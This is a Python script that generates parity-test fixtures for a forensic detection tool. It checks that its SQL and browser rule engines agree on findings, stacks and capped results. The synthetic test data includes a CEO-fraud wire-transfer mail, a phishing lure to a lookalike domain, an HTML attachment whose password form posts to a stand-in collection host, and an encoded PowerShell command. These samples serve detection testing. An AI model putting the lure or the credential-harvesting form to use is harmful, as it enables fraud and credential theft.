"""Engine parity fixture: the same rows through the SQL engine, recorded for the browser engine test.

The browser engine (rules/engine.ts) exists so that confidential evidence can be analysed without a
row ever reaching the server; the SQL engine (services/store/rules.py) exists for GB-scale cases.
Both must produce the same findings for the same rules and rows. This script builds a small mixed
scenario (Windows events, M365 rows, mails), runs every bundled rule on the DuckDB engine and writes
the rows and the resulting findings (key, severity, count, escalation) to tests/fixtures/parity/.
frontend/src/rules/parity.test.ts runs the browser engine on the same rows and fails on any difference. The stacks of a few fields
over the same events (services/store/queries.stack) go to stacks.json for
frontend/src/data/stack.parity.test.ts, which stacks them in the browser store. A few rules past
their finding cap run on rows of their own, and cap.json records which findings the SQL engine kept
and what it said about the cut.

    .venv\\Scripts\\python.exe tools\\parity_fixture.py        # rewrite the fixture after changing an engine or a rule
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
import uuid
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "backend"))
sys.path.insert(0, str(ROOT / "samples" / "synthetic"))
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "forensic.settings")

import make_m365  # noqa: E402
import rule_samples as RS  # noqa: E402
from mail_calibration import examples, message  # noqa: E402

from api.views.meta import load_rules  # noqa: E402
from services.parsers import m365  # noqa: E402
from services.parsers.mail.common import ParseContext, RawAttachment, build_row  # noqa: E402
from services.store import queries as Q  # noqa: E402
from services.store import rules as R  # noqa: E402
from services.store.casestore import StoreRegistry  # noqa: E402
from services.store.writers import EventWriter, MailWriter  # noqa: E402

OUT = ROOT / "tests" / "fixtures" / "parity"
# (field, filter, order): the stacks both stores must agree on
STACKS: list[tuple[str, dict[str, Any] | None, str]] = [
    ("image", None, "rare"),
    ("commandLine", None, "rare"),
    ("serviceName", None, "common"),
    ("targetUser", None, "rare"),
    ("ipAddress", {"conditions": [{"field": "eventId", "op": "in", "value": [4624, 4625]}]}, "rare"),
    ("providerEventId", None, "rare"),
    ("processName", {"text": "powershell"}, "rare"),
]
M365_EXPORTS = (
    "entra-risk-detections.graph.json",
    "entra-risky-users.graph.json",
    "entra-directory-audits.graph.json",
    "exo-messagetrace.get-messagetrace.csv",
    "exo-messagetrace.extended.csv",
)
SETTINGS: dict[str, Any] = {
    "internal_domains": ["contoso.com", "interne.fr"],
    "expected_countries": ["FR"],
    "vip_names": ["lefevre marie", "alice martin"],
    "admin_accounts": ["administrator", "adm-*"],
    "service_accounts": ["svc_backup"],
    "internal_ips": ["10.0.0.0/8", "192.168.0.0/16"],
    "brands": ["contoso"],
    "trusted_senders": [],
    "businessHours": {"start": 8, "end": 19, "tz": "Europe/Paris"},
    "weekendDays": [0, 6],
}


def events() -> list[dict[str, Any]]:
    rows = list(RS.build())
    for r in make_m365.ual_records():
        rows.append(m365.ual_row(r))
    for s in make_m365.entra_signins():
        rows.append(m365.entra_row(s))
    # ID Protection, directory audits and the message trace, as the import reads the test exports
    for name in M365_EXPORTS:
        data = (ROOT / "tests" / "fixtures" / "m365" / name).read_bytes()
        rows.extend(m365.iter_records(None, data, m365.detect_format(name, data) or "", include_raw=False))
    rows.sort(key=lambda r: r.get("ts") or 0)
    return rows


def mails() -> list[dict[str, Any]]:
    ctx = ParseContext(internal_domains=["contoso.com", "interne.fr"], brands=["contoso"], vip_names=["lefevre marie", "alice martin"])
    rows = [e["row"] for e in examples()]
    rows.append(
        message(
            "Payment update",
            "Please handle this urgent wire transfer today and keep it confidential; I am in a meeting. Thanks, Marie Lefevre",
            reply_to="Marie Lefevre <marie.lefevre.ceo@gmail.com>",
        )
    )
    lure = [
        ("From", "IT Support <it-support@contoso-secure.com>"),
        ("To", "Alice <alice@contoso.com>"),
        ("Subject", "Password expires today"),
        ("Date", "Tue, 1 Sep 2026 09:05:00 +0000"),
        ("Message-ID", "<lure-1@contoso-secure.com>"),
        ("Received", "from mail.contoso-secure.com ([203.0.113.10]) by mx.contoso.com; Tue, 1 Sep 2026 09:05:01 +0000"),
        ("Authentication-Results", "mx.contoso.com; spf=fail smtp.mailfrom=contoso-secure.com; dkim=none; dmarc=fail header.from=contoso-secure.com"),
    ]
    rows.append(
        build_row(
            lure,
            "Your password expires today. Verify your account now: https://login-contoso.evil-login.net/session",
            '<html><body><a href="https://login-contoso.evil-login.net/session">https://contoso.com/portal</a></body></html>',
            [],
            ctx,
        )
    )
    rows.append(
        build_row(
            lure[:2] + [("Subject", "Invoice attached")] + lure[3:],
            "See attached.",
            None,
            [
                RawAttachment(
                    "invoice.html", b'<html><body><form action="https://collect.evil-login.net/x"><input type="password" name="pw"></form></body></html>'
                )
            ],
            ctx,
        )
    )
    for r in rows:
        r.pop("id", None)
    return rows


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    ev_rows = events()
    ev_rows.extend(
        [
            {"artifactType": "service", "serviceName": "PSEXESVC", "serviceFile": r"C:\Users\Public\demo.exe", "recordKind": "observation"},
            {"artifactType": "process", "commandLine": "powershell.exe -enc AAAA", "recordKind": "observation"},
            {"artifactType": "connection", "image": r"C:\Windows\powershell.exe", "destinationIp": "203.0.113.10", "recordKind": "observation"},
            {"artifactType": "defender", "message": "Threat detected: synthetic", "recordKind": "observation"},
            {"artifactType": "prefetch", "processName": "POWERSHELL.EXE", "ts": 1788948000000, "recordKind": "event"},
            {"artifactType": "service", "serviceName": "Expected", "serviceFile": r"C:\Program Files\Vendor\demo.exe", "recordKind": "observation"},
            # appdata is the low rule's for an autorun and the high rule's for a service, and a temp folder under it is the high rule's
            {"artifactType": "autorun", "name": "Sync", "image": r"C:\Users\demo\AppData\Local\Sync\sync.exe", "recordKind": "observation"},
            {"artifactType": "autorun", "name": "Stage", "image": r"C:\Users\demo\AppData\Local\Temp\stage.exe", "recordKind": "observation"},
            {"artifactType": "service", "serviceName": "SyncSvc", "serviceFile": r"%APPDATA%\Sync\syncsvc.exe", "recordKind": "observation"},
            # the same programs on other hosts, spelled in other cases, for the stacks
            {"artifactType": "process", "image": r"C:\Windows\System32\svchost.exe", "computer": "WS02.contoso.com", "recordKind": "observation"},
            {"artifactType": "process", "image": r"c:\windows\system32\SVCHOST.EXE", "computer": "ws03", "recordKind": "observation"},
            {"artifactType": "process", "image": r"C:\WINDOWS\explorer.exe", "computer": "WS02", "recordKind": "observation"},
        ]
    )
    ml_rows = mails()
    bundled = [x["rule"] for x in load_rules(ROOT / "rules") if "rule" in x]
    with tempfile.TemporaryDirectory() as tmp:
        reg = StoreRegistry()
        reg.configure(Path(tmp) / "cases")
        store = reg.get(str(uuid.uuid4()))
        try:
            w = EventWriter(store, 1)
            for r in ev_rows:
                w.add(dict(r))
            w.flush()
            mw = MailWriter(store, 2)
            for r in ml_rows:
                mw.add(dict(r))
            mw.flush()
            with store.lock:
                stored_ev = store._con.execute('SELECT id, "eventId", ts FROM events ORDER BY id').fetchall()
                stored_ml = store._con.execute("SELECT id, subject FROM mails ORDER BY id").fetchall()
            res = R.run_rules(store, bundled, SETTINGS)
            stacks = [{"field": f, "filter": flt, "order": o, "stack": Q.stack(store, flt, f, o, 500, SETTINGS)} for f, flt, o in STACKS]
        finally:
            reg.close_all()
    # the writers assign ids in insertion order starting at 1: give the browser rows the same ids
    for i, r in enumerate(ev_rows, 1):
        r["id"] = i
    for i, r in enumerate(ml_rows, 1):
        r["id"] = i
    assert [x[0] for x in stored_ev] == list(range(1, len(ev_rows) + 1)), "event ids are not sequential"
    assert [x[0] for x in stored_ml] == list(range(1, len(ml_rows) + 1)), "mail ids are not sequential"
    # severity, count and escalation too: two engines that agree on which findings exist can still
    # disagree on how bad they are
    expected: dict[str, list[dict[str, Any]]] = {}
    for f in res["findings"]:
        rated = {"key": f["key"], "severity": f["severity"], "count": f["count"], "escalation": f.get("escalation")}
        expected.setdefault(f["ruleId"], []).append(rated)
    for k in expected:
        expected[k].sort(key=lambda x: x["key"])
    (OUT / "events.json").write_text(json.dumps(ev_rows, default=str), encoding="utf-8")
    (OUT / "mails.json").write_text(json.dumps(ml_rows, default=str), encoding="utf-8")
    (OUT / "expected.json").write_text(
        json.dumps(
            {
                "settings": SETTINGS,
                "rules": sorted(r["id"] for r in bundled),
                "errors": res["errors"],
                "findings": expected,
                "diagnostics": {d["ruleId"]: d["reason"] for d in res["diagnostics"]},
            },
            indent=1,
            sort_keys=True,
        ),
        encoding="utf-8",
    )
    (OUT / "stacks.json").write_text(json.dumps({"settings": SETTINGS, "stacks": stacks}, indent=1, sort_keys=True, default=str), encoding="utf-8")
    fired = len(expected)
    print(
        f"{len(ev_rows)} events, {len(ml_rows)} mails, {len(bundled)} bundled rules: {fired} fired, {sum(len(v) for v in expected.values())} findings, {len(res['errors'])} error(s)"
    )
    for e in res["errors"]:
        print("  error", e)
    cap_case()


# Rules past their cap, each a different way of choosing what to keep. The rows are invented: first
# seen in an order unlike the order the cap keeps, with ties in time and a row without a time.
CAP_T0 = 1788300000000
CAP_RULES: list[dict[str, Any]] = [
    {"id": "cap-rows", "title": "log cleared", "severity": "high", "source": "events", "where": {"eventId": 1102}, "max_findings": 3},
    {
        "id": "cap-rarest",
        "title": "failures by account",
        "severity": "low",
        "source": "events",
        "where": {"eventId": 4625},
        "group_by": ["targetUser"],
        "max_findings": 2,
    },
    {
        "id": "cap-largest",
        "title": "repeated failures by account",
        "severity": "medium",
        "source": "events",
        "where": {"eventId": 4625},
        "group_by": ["targetUser"],
        "threshold": ">= 2",
        "max_findings": 2,
    },
    {
        "id": "cap-bursts",
        "title": "failure bursts by address",
        "severity": "medium",
        "source": "events",
        "where": {"eventId": 4625},
        "group_by": ["ipAddress"],
        "window": "1m",
        "threshold": ">= 2",
        "max_findings": 3,
    },
    {
        "id": "cap-collapsed",
        "title": "failed logons",
        "severity": "low",
        "source": "events",
        "where": {"eventId": 4625},
        "entities": ["targetUser"],
        "collapse_after": 3,
        "max_findings": 2,
    },
]


def cap_rows() -> list[dict[str, Any]]:
    # five log clearings, two at the same time and one without a time
    rows: list[dict[str, Any]] = [{"eventId": 1102, "computer": "WS01", "subjectUser": "operator"} for _ in range(5)]
    for r, offset in zip(rows, (50, 10, None, 10, 30), strict=True):
        if offset is not None:
            r["ts"] = CAP_T0 + offset * 1000
    # fifteen failed logons from three addresses, two bursts each; the accounts fail 1 (amy, zed), 2,
    # 3, 4 and 4 times, the smaller groups and the last address seen first
    failures = sorted((i * 20 + offset, ip) for i, ip in enumerate(("203.0.113.30", "198.51.100.20", "192.0.2.10")) for offset in (0, 10, 300, 310, 320))
    users = ["bob", "cat", "eve", "dan", "zed", "bob", "cat", "dan", "eve", "cat", "dan", "eve", "amy", "dan", "eve"]
    for (offset, ip), user in zip(failures, users, strict=True):
        rows.append({"eventId": 4625, "computer": "WS01", "ipAddress": ip, "targetUser": user, "ts": CAP_T0 + offset * 1000})
    return rows


def cap_case() -> None:
    rows = cap_rows()
    with tempfile.TemporaryDirectory() as tmp:
        reg = StoreRegistry()
        reg.configure(Path(tmp) / "cases")
        store = reg.get(str(uuid.uuid4()))
        try:
            w = EventWriter(store, 1)
            for r in rows:
                w.add(dict(r))
            w.flush()
            with store.lock:
                stored = [x[0] for x in store._con.execute("SELECT id FROM events ORDER BY id").fetchall()]
            res = R.run_rules(store, CAP_RULES, {})
        finally:
            reg.close_all()
    assert stored == list(range(1, len(rows) + 1)), "event ids are not sequential"
    for i, r in enumerate(rows, 1):
        r["id"] = i
    findings: dict[str, list[str]] = {}
    for f in res["findings"]:
        findings.setdefault(f["ruleId"], []).append(f["key"])
    cuts = {d["ruleId"]: {"detail": d["detail"], "dropped": d["dropped"]} for d in res["diagnostics"] if d["reason"] == "truncated"}
    assert not res["errors"] and set(cuts) == {r["id"] for r in CAP_RULES}, (res["errors"], cuts)
    (OUT / "cap.json").write_text(
        json.dumps(
            {"default": R.MAX_FINDINGS, "rows": rows, "rules": CAP_RULES, "findings": {k: sorted(v) for k, v in findings.items()}, "cuts": cuts},
            indent=1,
            sort_keys=True,
        ),
        encoding="utf-8",
    )
    print(f"{len(CAP_RULES)} rules past their cap: {', '.join(f'{k} left out {v["dropped"]}' for k, v in sorted(cuts.items()))}")


if __name__ == "__main__":
    main()
